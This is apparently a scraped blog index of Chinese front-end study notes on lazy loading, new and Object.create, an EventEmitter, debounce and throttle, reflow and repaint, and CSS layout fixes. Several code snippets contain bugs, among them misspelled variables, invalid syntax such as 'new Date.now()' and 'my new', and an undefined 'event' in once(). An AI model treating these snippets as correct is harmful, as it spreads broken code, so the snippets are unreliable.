true，表明允许请求发送证书数据。 123456789const canvas=document.createElement(&#x27;canvas&#x27;);const context=canvas.getContext(&#x27;2d&#x27;);const img=new Image();img.crossOrigin=&#x27;anonymous&#x27;;img.onload=()=&gt;&#123; context.drawImage(this,0,0); context.getImageData(0,0,img.width,img.height);&#125;img.src=&quot;https://b.com/a.png&quot;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"图片懒加载","slug":"图片懒加载","date":"2022-04-25T09:07:16.000Z","updated":"2022-04-27T15:41:55.061Z","comments":true,"path":"2022/04/25/图片懒加载/","link":"","permalink":"https://coloey.github.io/2022/04/25/%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD/","excerpt":"","text":"实现图片懒加载 懒加载是一种网页性能优化方式，提升用户体验，比如懒加载图片，进入页面时，我们只请求可视区域的图片资源 总结： 全部加载会影响用户体验 浪费用户的流量，有些用户不想全部看完，全部加载会耗费大量流量 实现方式： html实现 最简单的实现方式给img标签加上 loading=”lazy” 1&lt;img src=&quot;./example.jpg&quot; loading=&quot;lazy&quot;&gt; js实现原理 通过js监听页面的滚动 使用js实现的原理主要是判断当前图片是否到了可视区域： 拿到所有图片的dom 遍历每个图片判断当前图片是否到达了可视区域范围 如果到了就设置图片的src属性 绑定window的scroll事件，对其进行事件监听 在页面初始化时，img图片的src放在data-src属性上，当匀速处于可视区范围，就把data-src赋值给src属性，完成图片加载 1234567891011121314151617181920212223242526&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot; /&gt; &lt;title&gt;Lazyload&lt;/title&gt; &lt;style&gt; img &#123; display: block; margin-bottom: 50px; height: 200px; width: 400px; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;img src=&quot;./img/default.png&quot; data-src=&quot;./img/1.jpg&quot; /&gt; &lt;img src=&quot;./img/default.png&quot; data-src=&quot;./img/2.jpg&quot; /&gt; &lt;img src=&quot;./img/default.png&quot; data-src=&quot;./img/3.jpg&quot; /&gt; &lt;img src=&quot;./img/default.png&quot; data-src=&quot;./img/4.jpg&quot; /&gt; &lt;img src=&quot;./img/default.png&quot; data-src=&quot;./img/5.jpg&quot; /&gt; &lt;img src=&quot;./img/default.png&quot; data-src=&quot;./img/6.jpg&quot; /&gt; &lt;img src=&quot;./img/default.png&quot; data-src=&quot;./img/7.jpg&quot; /&gt; &lt;img src=&quot;./img/default.png&quot; data-src=&quot;./img/8.jpg&quot; /&gt; &lt;img src=&quot;./img/default.png&quot; data-src=&quot;./img/9.jpg&quot; /&gt; &lt;img src=&quot;./img/default.png&quot; data-src=&quot;./img/10.jpg&quot; /&gt; &lt;/body&gt;&lt;/html&gt; 先获取所有图片的dom,通过document.body.clientHeight获取可视区高度，在使用element.getBoundingClientRect()直接得到元素相对浏览器的top值，遍历每个图片判断图片是否到达了可视区域 12345678910111213function lazyLoad()&#123; let viewHeight=document.body.clientHeight;//获取可视区高度 let imgs=document.querySelectorAll(&quot;img[data-src]&quot;) imgs.forEach(item=&gt;&#123; if(item.data-src==&#x27;&#x27;)return; let rect=item.getBoundingClientRect(); if(rect.top&lt;viewHeight&amp;&amp;rect.bottom&gt;=0)&#123; item.src=item.data-src item.removeAttribute(&#x27;data-src&#x27;) &#125; &#125;) &#125; 这样存在性能问题，因为scroll事件会在很短事件内触发多次，严重影响页面性能，为了提高网页性能，我们需要一个节流函数来控制函数的多次触发，在一段时间内只执行一次回调 12345678910111213function throttle(fn,delay)&#123; let timer=null; return function(fn,...args)&#123; const context=this; if(!temer)&#123; timer=setTimeout(()=&gt;&#123; fn.apply(context,args); timer=null; &#125;) &#125; &#125;&#125; scroll 1window.addEventListener(&quot;scroll&quot;,throttle(lazyload,200)) 拓展： IntersectionObserver通过上面例子的实现，我们要实现懒加载都需要去监听 scroll 事件，尽管我们可以通过函数节流的方式来阻止高频率的执行函数，但是我们还是需要去计算 scrollTop，offsetHeight 等属性，有没有简单的不需要计算这些属性的方式呢，答案就是 IntersectionObserver。 IntersectionObserver 是一个比较新的 API，可以自动”观察”元素是否可见，Chrome 51+ 已经支持。由于可见（visible）的本质是，目标元素与视口产生一个交叉区，所以这个 API 叫做”交叉观察器”。我们来看一下它的用法 []: https://developer.mozilla.org/zh-CN/docs/Web/API/IntersectionObserver 12345678910111213141516171819202122const imgs=document.querySelectorAll(&quot;img[data-src]&quot;);const config=&#123; rootMargin:&#x27;0px&#x27;, threshold:0&#125;let observer=new IntersectionObserver((entries,self)=&gt;&#123; entries.forEach((entry)=&gt;&#123; if(entry.isIntersecting)&#123; let img=entry.target; let realsrc=img.dataset.src; if(src)&#123; img.src=realsrc; img.removeAttribute(&#x27;data-src&#x27;) &#125; self.unobserve(entry.target);//解除观察 &#125; &#125;)&#125;,config)imgs.forEach((image)=&gt;&#123; observer.observe(image)&#125;)","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"object.create()和new区别","slug":"object-create-和new区别","date":"2022-04-25T02:44:18.000Z","updated":"2022-05-01T01:54:53.464Z","comments":true,"path":"2022/04/25/object-create-和new区别/","link":"","permalink":"https://coloey.github.io/2022/04/25/object-create-%E5%92%8Cnew%E5%8C%BA%E5%88%AB/","excerpt":"","text":"Object.create()123456Object.creat=function(o)&#123; var F=function()&#123;&#125;; F.prototype=o; return new F(); &#125; 内部定义一个新对象，并且让F.prototype对象赋值为引进的对象/函数o,并return一个新的对象 new1234567function(o,...args)&#123; var o1=&#123;&#125;; o1.__proto__=o.prototype; var res=o.call(o1,args); return res typeof Object?res:o1; &#125; 区别：12345678var Base=function()&#123; this.a=2;&#125;var o1=new Base();var o2=Object.create(Base);console.log(o1.a);//2console.log(o2.a);//undefined Object.create失去了原来对象属性的访问：F创建后函数调用结束后被销毁，o2直接指向Base构造函数，o2没有指向它的prototype，因此o2.consructor不能通过prototype对找到构造函数，所以是undefined,但是如果Base是一个对象，则o2.a值为2，因为o2的[[Prototype]]指向了对象Base 12345678var Base = function () &#123; this.a = 2&#125;Base.prototype.a = 3;var o1 = new Base();var o2 = Object.create(Base);console.log(o1.a); // 2console.log(o2.a); // undefined 这里Base.prototype.a会去找它的[[Prototype]]上看是否有a，没有就重新设置了一个a，值为3，**而实际上o1.constructor通过默认的[[Prototype]]委托指向Base.prototype,进而委托到constructor指向的构造函数。所以这里的o1.a=2;o2.a仍旧是undefined，因为o2直接指向的是Base,没有指向它的prototype 小结小结 比较 new Object.create 构造函数 保留原构造函数属性 丢失原构造函数属性 原型链 原构造函数prototype属性 原构造函数/（对象）本身 作用对象 function function和object","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"new 原理","slug":"new-原理","date":"2022-04-24T15:50:57.000Z","updated":"2022-04-24T15:56:45.459Z","comments":true,"path":"2022/04/24/new-原理/","link":"","permalink":"https://coloey.github.io/2022/04/24/new-%E5%8E%9F%E7%90%86/","excerpt":"","text":"一、是什么在JavaScript中，new操作符用于创建一个给定构造函数的实例对象 例子 123456789101function Person(name, age)&#123;2 this.name = name;3 this.age = age;4&#125;5Person.prototype.sayName = function () &#123;6 console.log(this.name)7&#125;8const person1 = new Person(&#x27;Tom&#x27;, 20)9console.log(person1) // Person &#123;name: &quot;Tom&quot;, age: 20&#125;10t.sayName() // &#x27;Tom&#x27; 从上面可以看到： new 通过构造函数 Person 创建出来的实例可以访问到构造函数中的属性 new 通过构造函数 Person 创建出来的实例可以访问到构造函数原型链中的属性（即实例与构造函数通过原型链连接了起来） 现在在构建函数中显式加上返回值，并且这个返回值是一个原始类型 1234561function Test(name) &#123;2 this.name = name3 return 14&#125;5const t = new Test(&#x27;xxx&#x27;)6console.log(t.name) // &#x27;xxx&#x27; 可以发现，构造函数中返回一个原始值，然而这个返回值并没有作用 下面在构造函数中返回一个对象 123456781function Test(name) &#123;2 this.name = name3 console.log(this) // Test &#123; name: &#x27;xxx&#x27; &#125;4 return &#123; age: 26 &#125;5&#125;6const t = new Test(&#x27;xxx&#x27;)7console.log(t) // &#123; age: 26 &#125;8console.log(t.name) // &#x27;undefined&#x27; 从上面可以发现，构造函数如果返回值为一个对象，那么这个返回值会被正常使用 二、流程从上面介绍中，我们可以看到new关键字主要做了以下的工作： 创建一个新的对象obj 将对象与构建函数通过原型链连接起来 将构建函数中的this绑定到新建的对象obj上 根据构建函数返回类型作判断，如果是原始值则被忽略，如果是返回对象，需要正常处理 举个例子： 12345671function Person(name, age)&#123;2 this.name = name;3 this.age = age;4&#125;5const person1 = new Person(&#x27;Tom&#x27;, 20)6console.log(person1) // Person &#123;name: &quot;Tom&quot;, age: 20&#125;7t.sayName() // &#x27;Tom&#x27; 手写new 操作符123456function my new(Func,..args)&#123; const obj=&#123;&#125;; obj.__proto__=Func.prototype; let result=Func.apply(obj,args); return result instanceOf Object?result:obj&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"实现node中的EventEmitter","slug":"实现node中的EventEmitter","date":"2022-04-24T14:08:59.000Z","updated":"2022-05-29T07:46:55.743Z","comments":true,"path":"2022/04/24/实现node中的EventEmitter/","link":"","permalink":"https://coloey.github.io/2022/04/24/%E5%AE%9E%E7%8E%B0node%E4%B8%AD%E7%9A%84EventEmitter/","excerpt":"","text":"一、是什么我们了解到，Node 采用了事件驱动机制，而EventEmitter 就是Node实现事件驱动的基础 在EventEmitter的基础上，Node 几乎所有的模块都继承了这个类，这些模块拥有了自己的事件，可以绑定／触发监听器，实现了异步操作 Node.js 里面的许多对象都会分发事件，比如 fs.readStream 对象会在文件被打开的时候触发一个事件 这些产生事件的对象都是 events.EventEmitter 的实例，这些对象有一个 eventEmitter.on() 函数，用于将一个或多个函数绑定到命名事件上 二、使用方法Node 的events模块只提供了一个EventEmitter类，这个类实现了Node异步事件驱动架构的基本模式——观察者模式 在这种模式中，被观察者(主体)维护着一组其他对象派来(注册)的观察者，有新的对象对主体感兴趣就注册观察者，不感兴趣就取消订阅，主体有更新的话就依次通知观察者们 基本代码如下所示： 1234567891011const EventEmitter = require(&#x27;events&#x27;)class MyEmitter extends EventEmitter &#123;&#125;const myEmitter = new MyEmitter()function callback() &#123; console.log(&#x27;触发了event事件！&#x27;)&#125;myEmitter.on(&#x27;event&#x27;, callback)myEmitter.emit(&#x27;event&#x27;)myEmitter.removeListener(&#x27;event&#x27;, callback); 通过实例对象的on方法注册一个名为event的事件，通过emit方法触发该事件，而removeListener用于取消事件的监听 关于其常见的方法如下： emitter.addListener/on(eventName, listener) ：添加类型为 eventName 的监听事件到事件数组尾部 emitter.prependListener(eventName, listener)：添加类型为 eventName 的监听事件到事件数组头部 emitter.emit(eventName[, …args])：触发类型为 eventName 的监听事件 emitter.removeListener/off(eventName, listener)：移除类型为 eventName 的监听事件 emitter.once(eventName, listener)：添加类型为 eventName 的监听事件，以后只能执行一次并删除 emitter.removeAllListeners([eventName])： 移除全部类型为 eventName 的监听事件 三、实现过程通过上面的方法了解，EventEmitter是一个构造函数，内部存在一个包含所有事件的对象 12345class EventEmitter &#123; constructor() &#123; this.events = &#123;&#125;; &#125;&#125; 其中events存放的监听事件的函数的结构如下： 12345&#123; &quot;event1&quot;: [f1,f2,f3]， &quot;event2&quot;: [f4,f5]， ...&#125; 然后开始一步步实现实例方法，首先是emit，第一个参数为事件的类型，第二个参数开始为触发事件函数的参数，实现如下： 12345emit(type, ...args) &#123; this.events[type].forEach((item) =&gt; &#123; Reflect.apply(item, this, args); &#125;);&#125; 当实现了emit方法之后，然后实现on、addListener、prependListener这三个实例方法，都是添加事件监听触发函数，实现也是大同小异 1234567891011121314151617on(type, handler) &#123; if (!this.events[type]) &#123; this.events[type] = []; &#125; this.events[type].push(handler);&#125;addListener(type,handler)&#123; this.on(type,handler)&#125;prependListener(type, handler) &#123; if (!this.events[type]) &#123; this.events[type] = []; &#125; this.events[type].unshift(handler);&#125; 紧接着就是实现事件监听的方法removeListener/on 12345678910removeListener(type, handler) &#123; if (!this.events[type]) &#123; return; &#125; this.events[type] = this.events[type].filter(item =&gt; item !== handler);&#125;off(type,handler)&#123; this.removeListener(type,handler)&#125; 最后再来实现once方法， 再传入事件监听处理函数的时候进行封装，利用闭包的特性维护当前状态，通过fired属性值判断事件函数是否执行过 123456789101112131415161718once(type, handler) &#123; this.on(type, this._onceWrap(type, handler, this)); &#125; _onceWrap(type, handler, target) &#123; const state = &#123; fired: false, handler, type , target&#125;; const wrapFn = this._onceWrapper.bind(state); state.wrapFn = wrapFn; return wrapFn; &#125; _onceWrapper(...args) &#123; if (!this.fired) &#123; this.fired = true; Reflect.apply(this.handler, this.target, args); this.target.off(this.type, this.wrapFn); &#125; &#125; 完整代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243class EventEmitter &#123; constructor()&#123; this.events=&#123;&#125;; &#125; on(type,handler)&#123; if(!this.events[type])&#123; this.events[type]=[] &#125; this.events[type].push(handler) &#125; addListener(type,handler)&#123; this.on(type,handler) &#125; prependListener(type,handler)&#123; if(!this.events[type])&#123; this.events[type]=[] &#125; this.events[type].unshift(handler) &#125; removeListener(type,handler)&#123; if(!this.events[type])&#123; return; &#125; this.events[type]=this.events[type].filter(item=&gt;item!==handler) &#125; off(type,handler)&#123; this.removeListener(type,handler) &#125; emit(type,...args)&#123; this.events[type].forEach(item=&gt;&#123; Reflect.apply(item,this,args); &#125;) &#125; once(type,handler)&#123; //把监听器注销，即利用闭包，在内部函数中销毁了外部函数的引用 let temp=(...args)=&gt;&#123; handler(args); this.off(type,temp) &#125; this.on(event,temp) &#125;&#125;","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"},{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/tags/Node/"}]},{"title":"防抖节流","slug":"防抖节流","date":"2022-04-24T09:49:35.000Z","updated":"2022-08-14T08:22:39.367Z","comments":true,"path":"2022/04/24/防抖节流/","link":"","permalink":"https://coloey.github.io/2022/04/24/%E9%98%B2%E6%8A%96%E8%8A%82%E6%B5%81/","excerpt":"","text":"是什么本质上是优化高频率执行代码的一种手段 如：浏览器的 resize、scroll、keypress、mousemove 等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能 为了优化体验，需要对这类事件进行调用次数的限制，对此我们就可以采用throttle（节流）和debounce（防抖）的方式来减少调用频率 定义 节流: n 秒内只运行一次，若在 n 秒内重复触发，只有一次生效 防抖: n 秒后再执行该事件，若在 n 秒内被重复触发，则重新计时 节流：用时间戳实现： 123456789101112function throttled(fn,delay=500)&#123; let oldTime=new Date.now(); return function(...args)&#123; let context=this; let newTime=new Date.now(); if(newTime-oldTime&gt;=delay)&#123; fn.apply(context,args); oldTime=new Date.now(); &#125; &#125;&#125; 用定时器实现 123456789101112function throttled(fn,delay=500)&#123; let timer=null; return function(..args)&#123; let context=this; if(!timer)&#123;//n秒内只运行一次，若在n秒内重复触发，只有一次生效 timer=setTimeout(()=&gt;&#123; fn.apply(context,args); timer=null; &#125;,delay) &#125; &#125;&#125; 防抖：12345678910function debounce(fn,delay=500)&#123; let timer; return function(...args)&#123; let context=this; clearTimeout(timer); timer=setTimeout(()=&gt;&#123; fn.apply(context,args);//n秒内只能触发一次,若在n秒内重复触发，都会被清除,重新计时 &#125;,delay) &#125;&#125; 立即执行的防抖函数 12345678910111213141516function debounce(fn,delay=500,immediate)&#123; let timer; return function(...args)&#123; let context=this; if(timer)clearTimeout(timer); if(immediate)&#123; immediate=!immediate; fn.apply(context,args); &#125;else&#123; timer=setTimeout(()=&gt;&#123; fn.apply(context,args); &#125;,delay) &#125; &#125;&#125; 区别相同点： 都可以通过使用 setTimeout 实现 目的都是，降低回调执行频率。节省计算资源 不同点： 函数防抖，在一段连续操作结束后，处理回调，利用clearTimeout 和 setTimeout实现。函数节流，在一段连续操作中，每一段时间只执行一次，频率较高的事件中使用来提高性能 函数防抖关注一定时间连续触发的事件，因为会清除定时器，只在最后执行一次，而函数节流一段时间内只执行一次,不会清除定时器，因此会在隔一段时间执行一次。 例如，都设置时间频率为500ms，在2秒时间内，频繁触发函数，节流，每隔 500ms 就执行一次。防抖，则不管调动多少次方法，在2s后，只会执行一次 应用场景防抖在连续的事件，只需触发一次回调的场景有： 搜索框搜索输入。只需用户最后一次输入完，再发送请求 手机号、邮箱验证输入检测 窗口大小resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。 节流在间隔一段时间执行一次回调的场景有： 滚动加载，加载更多或滚到底部监听 搜索框，搜索联想功能","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"浏览器的回流和重绘","slug":"浏览器的回流和重绘","date":"2022-04-24T07:35:30.000Z","updated":"2022-08-23T03:30:57.703Z","comments":true,"path":"2022/04/24/浏览器的回流和重绘/","link":"","permalink":"https://coloey.github.io/2022/04/24/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%9B%9E%E6%B5%81%E5%92%8C%E9%87%8D%E7%BB%98/","excerpt":"","text":"是什么在HTML中，每个元素可以理解为一个盒子，在浏览器解析过程中，会涉及到回流和重绘： 回流：布局引擎会根据各种样式计算每个盒子在页面上的大小与位置 重绘：当计算好盒模型的位置，大小及其他属性后，浏览器根据每个盒子特性进行绘制 解析HTML,生成DOM树，解析CSS，生成CSSOM树 将DOM树和CSSOM树结合，生成渲染树Render Tree Layout(回流)：根据生成的渲染树，进行回流(Layout),得到节点的几何信息（位置，大小） Painting(重绘):根据渲染树以及回流得到的几何信息，得到节点的绝对像素 Display:将像素发送给GPU，展示在页面上 当我们对DOM的修改引发了DOM几何尺寸的变化（比如修改元素的宽、高或隐藏元素等）时，浏览器需要重新计算元素的几何属性，然后再将计算的结果绘制出来），即回流。 当对DOM的修改导致样式变化（color或background-color)却为影响几何属性，浏览器不需要重新计算元素的几何苏醒，直接为该元素绘制新的样式，这里仅仅触发重绘。 如何触发要想减少回流和重绘的次数，首先要了解回流和重绘是如何触发的 回流触发时机回流这一阶段主要是计算节点的位置和几何信息，那么当页面布局和几何信息发生变化的时候，就需要回流，如下面情况： 添加或删除可见的DOM元素 元素的位置发生变化 元素的尺寸发生变化（包括外边距，内边框，边框大小，高度，宽度等） 内容发生变化，比如文本变化或图片被另一个不同尺寸的图片所替代 页面一开始渲染（不可避免） 浏览器的窗口尺寸变化（因为回流是根据视口的大小来计算元素的位置和大小） 还有一些容易被忽略的操作：获取一些特定属性的值 offsetTop,offsetLetf,offsetWidth,offsetHeight,scrollTop,scrollLeft,scrollWidth,scrollHeight,clientTop,clientLeft,clientWidth,clientHeight 这些属性有一个共性，就是需要通过即时计算得到，因此浏览器为了获取这些值，也会进行回流，除此之外getComputedStyle方法的原理也一样 重绘触发时机：触发回流一定会触发重绘 引起重绘·的一些其他行为： 颜色修改 阴影修改 浏览器优化机制由于每次重排都会造成额外的计算消耗，因此大多数浏览器会通过队列化修改并批量执行来优化重排过程，浏览器会将修改操作放入到队列里，直到过了一段时间或者操作达到了一个阈值，才清空队列 当获取布局信息操作时，会强制队列刷新，包括前面讲到的offsetTop等方法都会返回最新的数据，因此浏览器不得不清空队列，触发回流重绘来返回正确的值 如何减少 如果设定元素的样式，通过修改元素的class类型（尽可能在DOM树的最里层） 避免设置多项内联样式 应用元素的动画，使用position属性为fixed或absolute的元素 避免使用table布局，table布局中每个元素的大小以及内容的改动，都会导致整个table的重新计算 对于那些复杂动画，对其设置position:fixed/absolute,尽可能地使元素脱离文档流，从而减少对其他元素的影响 使用css3硬件加速，可以让transform,opacity,filters这些动画不会引起回流重绘 避免使用CSS的JavaScript表达式 在使用JavaScript动态插入多个节点时，可以使用DocumentFragment,创建最后一次插入，就能避免多次的渲染性能 例如，多次修改一个元素布局时， 123456const el=document.getElementById(&quot;el&quot;)for(let i=0;i&lt;10;i++)&#123; el.style.top=el.offsetTop+10+&quot;px&quot;; el.style.left=el.offsetleft+10+&quot;px&quot;&#125; 每次循环都需要获取多次offset属性，比较糟糕，可以使用变量的形式缓存起来，待计算完毕再提交给浏览器发出重计算请求 123456789const el=document.getElementById(&quot;el&quot;)//先缓存offsetLeft和offsetTop的值let offLeft=el.offsetLeft,offTop=el.offsetTopfor(let i=0;i&lt;10;i++)&#123; offLeft+=10 offTop+=10&#125;el.styel.left=offLeft+&quot;px&quot;;el.style.top=offTop+&quot;px&quot; 我们还可避免修改样式，使用类名去合并样式 12345const container=document.getElementById(&quot;container&quot;)container.style.width=&#x27;100px&#x27;container.style.height = &#x27;200px&#x27;container.style.border = &#x27;10px solid red&#x27;container.style.color = &#x27;red&#x27; 使用类名去合并样式 1234567891011121&lt;style&gt;2 .basic_style &#123;3 width: 100px;4 height: 200px;5 border: 10px solid red;6 color: red;7 &#125;8&lt;/style&gt;9&lt;script&gt;10 const container = document.getElementById(&#x27;container&#x27;)11 container.classList.add(&#x27;basic_style&#x27;)12&lt;/script&gt; 前者每次单独操作，都去触发一次渲染树更改（新浏览器不会）， 都去触发一次渲染树更改，从而导致相应的回流与重绘过程 合并之后，等于我们将所有的更改一次性发出 我们还可以通过通过设置元素属性display: none，将其从页面上去掉，然后再进行后续操作，这些后续操作也不会触发回流与重绘，这个过程称为离线操作 12345const container = document.getElementById(&#x27;container&#x27;)container.style.width = &#x27;100px&#x27;container.style.height = &#x27;200px&#x27;container.style.border = &#x27;10px solid red&#x27;container.style.color = &#x27;red&#x27; 离线操作后 12345678let container = document.getElementById(&#x27;container&#x27;)container.style.display = &#x27;none&#x27;container.style.width = &#x27;100px&#x27;container.style.height = &#x27;200px&#x27;container.style.border = &#x27;10px solid red&#x27;container.style.color = &#x27;red&#x27;...（省略了许多类似的后续操作）container.style.display = &#x27;block&#x27;","categories":[{"name":"浏览器","slug":"浏览器","permalink":"https://coloey.github.io/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"}],"tags":[]},{"title":"解决相邻inline-block之间的间隔","slug":"解决相邻inline-block之间的间隔","date":"2022-04-23T15:35:04.000Z","updated":"2022-04-23T15:44:17.596Z","comments":true,"path":"2022/04/23/解决相邻inline-block之间的间隔/","link":"","permalink":"https://coloey.github.io/2022/04/23/%E8%A7%A3%E5%86%B3%E7%9B%B8%E9%82%BBinline-block%E4%B9%8B%E9%97%B4%E7%9A%84%E9%97%B4%E9%9A%94/","excerpt":"","text":"转载自 zhangxinxu from http://www.zhangxinxu.com 一、现象描述真正意义上的inline-block水平呈现的元素间，换行显示或空格分隔的情况下会有间距. 我们使用CSS更改非inline-block水平元素为inline-block水平，也会有该问题： 12345space a &#123; display: inline-block; padding: .5em 1em; background-color: #cad5eb;&#125; 12345&lt;div class=&quot;space&quot;&gt; &lt;a href=&quot;##&quot;&gt;惆怅&lt;/a&gt; &lt;a href=&quot;##&quot;&gt;淡定&lt;/a&gt; &lt;a href=&quot;##&quot;&gt;热血&lt;/a&gt;&lt;/div&gt; 这种表现是符合规范的应该有的表现。 元素被当成行内元素排版的时候，元素之间的空白符（空格、回车换行等）都会被浏览器处理，根据white-space的处理方式（默认是normal，合并多余空白），原来HTML代码中的回车换行被转成一个空白符，在字体不为0的情况下，空白符占据一定宽度，所以inline-block的元素之间就出现了空隙。这些元素之间的间距会随着字体的大小而变化，当行内元素font-size:16px时，间距为8px。 二、方法之移除空格元素间留白间距出现的原因就是标签段之间的空格，因此，去掉HTML中的空格，自然间距就木有了。考虑到代码可读性，显然连成一行的写法是不可取的，我们可以： 12345&lt;div class=&quot;space&quot;&gt; &lt;a href=&quot;##&quot;&gt;惆怅&lt;/a &gt;&lt;a href=&quot;##&quot;&gt;淡定&lt;/a &gt;&lt;a href=&quot;##&quot;&gt;热血&lt;/a&gt;&lt;/div&gt; 12345&lt;div class=&quot;space&quot;&gt; &lt;a href=&quot;##&quot;&gt;惆怅&lt;/a&gt;&lt;!-- --&gt;&lt;a href=&quot;##&quot;&gt;淡定&lt;/a&gt;&lt;!-- --&gt;&lt;a href=&quot;##&quot;&gt;热血&lt;/a&gt;&lt;/div&gt; 使用margin负值12341.space a &#123;2 display: inline-block;3 margin-right: -3px;4&#125; margin负值的大小与上下文的字体和文字大小相关 使用font-size:0类似下面的代码： 1234561.space &#123;2 font-size: 0;3&#125;4.space a &#123;5 font-size: 12px;6&#125; 这个方法，基本上可以解决大部分浏览器下inline-block元素之间的间距(IE7等浏览器有时候会有1像素的间距)。 使用letter-spacing 类似下面的代码： 1234561.space &#123;2 letter-spacing: -3px;3&#125;4.space a &#123;5 letter-spacing: 0;6&#125; 使用word-spacing类似下面代码： 1234561.space &#123;2 word-spacing: -6px;3&#125;4.space a &#123;5 word-spacing: 0;6&#125; 一个是字符间距(letter-spacing)一个是单词间距(word-spacing)，大同小异。据我测试，word-spacing的负值只要大到一定程度，其兼容性上的差异就可以被忽略。因为，貌似，word-spacing即使负值很大，也不会发生重叠。 与上面demo一样的效果，这里就不截图展示了。如果您使用Chrome浏览器，可能看到的是间距依旧存在。确实是有该问题，原因我是不清楚，不过我知道，可以添加display: table;或display:inline-table;让Chrome浏览器也变得乖巧。 12341.space &#123;2 display: inline-table;3 word-spacing: -6px;4&#125;","categories":[{"name":"CSS","slug":"CSS","permalink":"https://coloey.github.io/categories/CSS/"}],"tags":[]},{"title":"实现flex盒子最后一行左对齐","slug":"实现flex盒子最后一行左对齐","date":"2022-04-23T10:03:51.000Z","updated":"2022-04-23T15:05:53.977Z","comments":true,"path":"2022/04/23/实现flex盒子最后一行左对齐/","link":"","permalink":"https://coloey.github.io/2022/04/23/%E5%AE%9E%E7%8E%B0flex%E7%9B%92%E5%AD%90%E6%9C%80%E5%90%8E%E4%B8%80%E8%A1%8C%E5%B7%A6%E5%AF%B9%E9%BD%90/","excerpt":"","text":"问题：在CSS flex布局中，justify-content属性可以控制列表的水平对齐方式，例如space-between值可以实现两端对齐。 但是，如果最后一行的列表的个数不满，则就会出现最后一行没有完全垂直对齐的问题。 解决： 每一行固定列数：方法一：模拟space-between和间隙也就是我们不使用justify-content:space-between声明在模拟两端对齐效果。中间的gap间隙我们使用margin进行控制。 例如： 12345678910111213141516171819202122232425262728&lt;style&gt; .container &#123; display: flex; flex-wrap: wrap; &#125; .list &#123; width: 24%; height: 100px; background-color: skyblue; margin-top: 15px; &#125; .list:not(:nth-child(4n)) &#123; /* 100%-24%*4=4%,4%/3分配给不是4的倍数的盒子 */ margin-right: calc(4%/3) &#125;&lt;/style&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;list&quot;&gt;&lt;/div&gt; &lt;div class=&quot;list&quot;&gt;&lt;/div&gt; &lt;div class=&quot;list&quot;&gt;&lt;/div&gt; &lt;div class=&quot;list&quot;&gt;&lt;/div&gt; &lt;div class=&quot;list&quot;&gt;&lt;/div&gt; &lt;div class=&quot;list&quot;&gt;&lt;/div&gt; &lt;div class=&quot;list&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; 方法二：根据个数最后一个元素动态margin由于每一列的数目都是固定的，因此，我们可以计算出不同个数列表应当多大的margin值才能保证完全左对齐。 例如，假设每行4个元素，结果最后一行只有3个元素，则最后一个元素的margin-right大小是“列表宽度+间隙大小”的话，那最后3个元素也是可以完美左对齐的。 然后，借助树结构伪类数量匹配技术，我们可以知道最后一行有几个元素。 例如： .list:last-child:nth-child(4n - 1)说明最后一行，要么3个元素，要么7个元素…… .list:last-child:nth-child(4n - 2)说明最后一行，要么2个元素，要么6个元素…… 在本例中，一行就4个元素，因此，我们可以有如下CSS设置： 1234567891011121314151617181920.container &#123; display: flex; flex-wrap: wrap; &#125; .list &#123; width: 24%; height: 100px; background-color: skyblue; margin-top: 15px; /* 每个的margin-right默认为4%/3 */ margin-right: calc(4%/4); &#125; /* 最后一行3个 则最后一个的margin-right特殊设置*/ .list:last-child:nth-child(4n-1) &#123; margin-right: calc(24%+4%/3) &#125; /* 最后一行两个 */ .list:last-child:nth-child(4n-2)&#123; margin-right: calc(48%+8%/3) ; &#125; 子项宽度不固定最后一项margin-right:auto12345678910111213.container &#123; display:flex; justify-content: space-between; flex-wrap: wrap;&#125;.list &#123; bacground-color: skyblue; margin: 10px;&#125;/*最后一项margin-right:auto,让margin-right占据剩余空间*/.list:last-child &#123; margin-right:auto;&#125; 创建伪元素占据剩余空间1234567891011121314.container &#123; display: flex; justify-content: space-between; flex-wrap: wrap; &#125; .list &#123; height: 100px; background-color: skyblue; margin: 10px; &#125; .container::after &#123; content:&#x27;&#x27;; flex:1; &#125; 如果每一行列数不固定如果每一行的列数不固定，则上面的这些方法均不适用，需要使用其他技巧来实现最后一行左对齐。 这个方法其实很简单，也很好理解，就是使用足够的空白标签进行填充占位，具体的占位数量是由最多列数的个数决定的，例如这个布局最多7列，那我们可以使用7个空白标签进行填充占位，最多10列，那我们需要使用10个空白标签。 如下HTML示意： 123456789101&lt;div class=&quot;container&quot;&gt;2 &lt;div class=&quot;list&quot;&gt;&lt;/div&gt;3 &lt;div class=&quot;list&quot;&gt;&lt;/div&gt;4 &lt;div class=&quot;list&quot;&gt;&lt;/div&gt;5 &lt;div class=&quot;list&quot;&gt;&lt;/div&gt;6 &lt;div class=&quot;list&quot;&gt;&lt;/div&gt;7 &lt;div class=&quot;list&quot;&gt;&lt;/div&gt;8 &lt;div class=&quot;list&quot;&gt;&lt;/div&gt;9 